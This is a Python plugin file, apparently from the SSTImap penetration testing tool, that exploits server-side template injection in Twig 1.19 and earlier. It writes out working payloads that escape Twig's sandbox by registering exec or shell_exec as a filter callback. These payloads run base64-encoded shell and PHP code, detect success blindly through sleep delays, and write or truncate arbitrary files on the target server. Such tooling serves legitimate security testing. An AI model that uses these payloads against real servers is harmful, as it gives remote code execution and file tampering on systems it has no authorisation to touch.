from plugins.languages import php
from core import bash
from utils import rand


class Twig_v1(php.Php):
    legacy_plugin = True
    priority = 7
    plugin_info = {
        "Description": 'Twig模板引擎版本<=1.19',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Homepage: https://twig.symfony.com/",
            "Github: https://github.com/twigphp/Twig",
        ],
    }

    def init(self):
        # 易受攻击的版本 <1.20.0 允许映射 getFilter() 函数
        # 任何 PHP 函数，允许沙箱逃逸。
        # 只能映射具有 1 个参数的函数，而 eval()/assert() 函数则不能
        # 允许。因此，大部分工作是由 exec() 而不是 eval()-like 代码完成的。
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                # {{7*'7'}} 和 a{#b#}c 也可以在 freemarker 中使用
                # {%% set a=%i*%i %%}{{a}} 也适用于 Nunjucks
                # “sameas”在 1.x 中有效，但在 2.x 中被“same as”取代
                'test_render': f'{{% if 1 is sameas(1) %}}{{{{(1..3)|join}}}}{{% endif %}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                'test_render_expected': f'123{rand.randstrings[0]}<br />'
            },
            'render_error': {
                'render': '{code}',
                'header': '{{%set h={header[0]}+{header[1]}%}}',
                # Body需要设置b作为输出
                'trailer': '{{%set t={trailer[0]}+{trailer[1]}%}}{{{{include([h,b,t]|join)}}}}',
                'test_render': f'{{% if 1 is sameas(1) %}}{{%set a=(1..3)|join%}}{{% endif %}}{{%set b=[a,"{rand.randstrings[0]}"]|join%}}',
                'test_render_expected': f'123{rand.randstrings[0]}'
            },
            # 评估 PHP 代码的黑客方法
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_boolean': {
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'")}}}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2] 
            },
            'execute_error': {
                'execute': """{{{{_self.env.registerUndefinedFilterCallback("shell_exec")}}}}{{%set b=_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'")%}}""",
            },
            # 检查成功的黑客方法
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("shell_exec")}}}}{{{{ 1 / (_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{echo,SSTIMAP}}'")|trim('\\n') ends with "SSTIMAP")}}}}"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'")}}}}"""
            },
            'write': {
                'call': 'inject',
                'write': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'")}}}}""",
                'truncate': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("echo -n >{path}")}}}}"""
            },
        })
        
        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '', 'closures': php.ctx_closures},
            # 这会转义字符串“inter#{”asd”}polation”
            {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
            # 这会转义字符串 {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': php.ctx_closures},
        ])
